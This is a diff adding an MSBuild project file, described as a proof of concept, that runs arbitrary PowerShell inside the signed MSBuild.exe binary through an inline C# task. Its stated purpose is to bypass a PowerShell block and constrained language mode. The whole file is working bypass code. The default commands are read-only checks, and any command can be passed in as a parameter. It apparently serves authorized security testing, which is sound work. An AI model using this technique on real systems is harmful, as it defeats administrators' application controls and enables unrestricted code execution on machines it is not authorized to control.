@@ -1,0 +1,59 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- ASPAT PoC: run an arbitrary PowerShell command through the engine hosted
+       inside signed MSBuild.exe (no powershell.exe / pwsh.exe / new EXE).
+       Proves the PowerShell block is bypassable AND yields unrestricted (FullLanguage) PS.
+
+       Default run (proof-of-concept battery):
+         MSBuild.exe Invoke-EngineCommand.proj
+       Run a custom command:
+         MSBuild.exe Invoke-EngineCommand.proj /p:Cmd="Get-Process | Select-Object -First 3 Name,Id"
+
+       READ-ONLY demo commands. Change Cmd for your own authorized test cases. -->
+  <PropertyGroup>
+    <Cmd Condition="'$(Cmd)'==''">
+      "PSVersion   : " + $PSVersionTable.PSVersion.ToString();
+      "LanguageMode: " + $ExecutionContext.SessionState.LanguageMode;
+      "User        : " + [System.Security.Principal.WindowsIdentity]::GetCurrent().Name;
+      "Host process: " + [System.Diagnostics.Process]::GetCurrentProcess().ProcessName;
+      "OS (.NET)   : " + [System.Environment]::OSVersion.VersionString;
+      Add-Type -TypeDefinition 'public class ClmProof { public static string R(){ return "Add-Type COMPILED AND RAN -> engine is FULLY UNRESTRICTED"; } }';
+      [ClmProof]::R()
+    </Cmd>
+  </PropertyGroup>
+
+  <UsingTask TaskName="EngineRun" TaskFactory="CodeTaskFactory"
+             AssemblyFile="C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <ParameterGroup>
+      <Script ParameterType="System.String" Required="true" />
+    </ParameterGroup>
+    <Task>
+      <Reference Include="System.Management.Automation" />
+      <Code Type="Fragment" Language="cs">
+        <![CDATA[
+        using (var rs = System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace()) {
+          rs.Open();
+          using (var ps = System.Management.Automation.PowerShell.Create()) {
+            ps.Runspace = rs;
+            ps.AddScript(Script);
+            try {
+              var results = ps.Invoke();
+              foreach (var r in results)
+                if (r != null) Log.LogMessage(MessageImportance.High, "  " + r.ToString());
+              foreach (var err in ps.Streams.Error)
+                Log.LogMessage(MessageImportance.High, "  [ERROR] " + err.ToString());
+            } catch (System.Exception e) {
+              Log.LogMessage(MessageImportance.High, "  [EXCEPTION] " + e.Message);
+            }
+          }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+
+  <Target Name="Run">
+    <Message Importance="High" Text="=== PowerShell executed via MSBuild-hosted engine (no PS binary) ===" />
+    <EngineRun Script="$(Cmd)" />
+    <Message Importance="High" Text="=== end ===" />
+  </Target>
+</Project>
